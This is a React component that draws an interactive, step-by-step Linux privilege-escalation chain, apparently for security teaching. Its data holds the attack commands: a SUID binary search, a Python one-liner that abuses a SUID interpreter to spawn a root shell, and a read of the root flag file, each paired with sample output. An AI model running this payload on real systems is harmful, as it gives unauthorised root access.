import { useState } from 'react';
import { Terminal } from 'lucide-react';

interface ChainStep {
  step: number;
  title: string;
  sublabel: string;
  command: string;
  output: string;
  explanation: string;
}

const PRIVESC_STEPS: ChainStep[] = [
  {
    step: 1,
    title: 'Standard Shell Enumeration',
    sublabel: 'User: www-data (UID 1001)',
    command: 'id && whoami',
    output: 'uid=1001(www-data) gid=1001(www-data) groups=1001(www-data)',
    explanation: 'Initial low-privilege access gained through web vulnerability (e.g. RCE or webshell).'
  },
  {
    step: 2,
    title: 'SUID & Sudo Audit Probe',
    sublabel: 'Permission Audit',
    command: 'find / -perm -4000 2>/dev/null',
    output: '/usr/bin/python3 (SUID Bit set for root ownership!)',
    explanation: 'System audit discovers binary executable configured with SUID bit permissions running as root.'
  },
  {
    step: 3,
    title: 'GTFOBins Binary Abuse Payload',
    sublabel: 'Payload Injection',
    command: 'python3 -c "import os; os.execl(\'/bin/sh\', \'sh\', \'-p\')"',
    output: '# whoami -> root (UID 0)',
    explanation: 'Abusing SUID Python executable to spawn an interactive subshell retaining root administrative privileges.'
  },
  {
    step: 4,
    title: 'Root Flag Capture',
    sublabel: 'Full System Compromise',
    command: 'cat /root/root.txt',
    output: 'CP{LINUX_PRIV_ESC_ROOT_MASTERED_2026}',
    explanation: 'Administrative control achieved. Target host fully compromised.'
  }
];

export function PrivEscViz() {
  const [activeStepIdx, setActiveStepIdx] = useState<number>(0);
  const step = PRIVESC_STEPS[activeStepIdx];

  return (
    <div className="space-y-5 font-mono select-none w-full">
      {/* Attack Chain Stage Bar */}
      <div className="flex items-center justify-between gap-2 p-3 rounded-xl bg-[#F7F7F7] dark:bg-[#141414] border border-[#E5E5E5] dark:border-[#2A2A2A]">
        <div className="flex items-center gap-2 overflow-x-auto">
          <span className="text-xs font-bold text-[#888888] dark:text-[#777777] uppercase shrink-0">
            ATTACK CHAIN:
          </span>
          {PRIVESC_STEPS.map((s, idx) => {
            const isActive = activeStepIdx === idx;
            return (
              <button
                key={s.step}
                id={`privesc-step-${s.step}`}
                type="button"
                onClick={() => setActiveStepIdx(idx)}
                className={`px-3 py-1.5 rounded-lg text-xs font-bold uppercase transition-all cursor-pointer border shrink-0 ${
                  isActive
                    ? 'bg-[#111111] dark:bg-white text-white dark:text-black border-[#111111] dark:border-white shadow-sm'
                    : 'bg-white dark:bg-[#1C1C1C] text-[#666666] dark:text-[#999999] border-[#E5E5E5] dark:border-[#2A2A2A] hover:border-[#111111] dark:hover:border-white'
                }`}
              >
                0{s.step}. {s.title.split(' ')[0]}
              </button>
            );
          })}
        </div>
      </div>

      {/* SVG Escalation Chain Visual Canvas */}
      <div className="relative rounded-2xl border border-[#E5E5E5] dark:border-[#2A2A2A] bg-white dark:bg-[#101010] p-6 flex flex-col justify-between overflow-hidden min-h-[260px] shadow-sm">
        <svg viewBox="0 0 540 220" aria-label="Privilege Escalation Chain" className="w-full max-h-[260px]">
          {PRIVESC_STEPS.map((s, idx) => {
            const posX = 20 + idx * 130;
            const isSelected = activeStepIdx === idx;
            return (
              <g
                key={s.step}
                className="cursor-pointer"
                onClick={() => setActiveStepIdx(idx)}
              >
                <rect
                  x={posX} y="50" width="115" height="75" rx="10"
                  fill="var(--bg-card)"
                  stroke={isSelected ? 'currentColor' : 'var(--border)'}
                  strokeWidth={isSelected ? '3' : '1.5'}
                />
                <text x={posX + 57} y="80" textAnchor="middle" fontSize="10" fontFamily="monospace" fill="var(--text-muted)" fontWeight="800">
                  STEP 0{s.step}
                </text>
                <text x={posX + 57} y="98" textAnchor="middle" fontSize="11" fontFamily="monospace" fill="var(--text-primary)" fontWeight={isSelected ? '900' : '600'}>
                  {s.title.split(' ')[0]}
                </text>
                {isSelected && <rect x={posX + 37} y="68" width="40" height="4" rx="2" fill="currentColor" opacity="0.9" />}
              </g>
            );
          })}

          <text x="270" y="180" textAnchor="middle" fontSize="11" fontFamily="monospace" fill={activeStepIdx >= 2 ? '#f43f5e' : '#f59e0b'} fontWeight="900">
            {activeStepIdx === 3 ? '★ FULL ROOT PRIVILEGE ESCALATION COMPLETE' : `STAGES COMPLETED: ${activeStepIdx + 1} OF 4`}
          </text>
        </svg>
      </div>

      {/* Terminal Command & Explanation Inspector */}
      <div className="p-5 rounded-xl border border-[#E5E5E5] dark:border-[#2A2A2A] bg-white dark:bg-[#141414] space-y-4 shadow-xs">
        <div className="flex items-center justify-between border-b border-[#E5E5E5] dark:border-[#2A2A2A] pb-3">
          <div className="flex items-center gap-2.5">
            <Terminal size={16} />
            <span className="text-sm font-extrabold uppercase tracking-wide text-[#111111] dark:text-white font-heading">
              STAGE 0{step.step}: {step.title}
            </span>
          </div>
          <span className="text-xs font-bold text-[#888888] dark:text-[#777777] uppercase font-mono">
            {step.sublabel}
          </span>
        </div>

        <p className="text-xs sm:text-sm text-[#555555] dark:text-[#B5B5B5] font-sans leading-relaxed">
          {step.explanation}
        </p>

        <div className="p-3.5 rounded-lg bg-[#F7F7F7] dark:bg-[#181818] border border-[#E5E5E5] dark:border-[#2A2A2A] space-y-2 font-mono text-xs">
          <div className="flex items-center gap-2 text-[#888888]">
            <Terminal size={14} />
            <span className="text-[10px] font-bold uppercase">EXECUTED EXPLOIT PROBE</span>
          </div>
          <code className="block text-[#111111] dark:text-white font-bold text-xs bg-white dark:bg-black p-2.5 rounded-md border border-[#E5E5E5] dark:border-[#2A2A2A]">
            $ {step.command}
          </code>
          <code className="block text-xs text-emerald-600 dark:text-emerald-400 font-mono pt-1 font-bold">
            OUTPUT: {step.output}
          </code>
        </div>
      </div>
    </div>
  );
}
